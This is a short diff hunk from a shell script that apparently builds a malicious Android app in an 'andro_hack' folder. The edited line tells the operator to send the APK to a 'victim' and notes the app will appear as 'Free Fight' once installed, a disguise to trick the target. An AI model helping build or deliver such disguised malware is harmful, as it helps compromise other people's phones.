@@ -154,7 +154,7 @@ echo " "
 echo " Opening file system..............."
 echo " "
 sleep 0.5
-echo " Send the apk to victim ..........."
+echo " Send the apk to victim ..........(Note : after installing the apk name will changed to Free Fight."
 sleep 0.5
 rm key.jks
 xdg-open /home/$s/Desktop/andro_hack
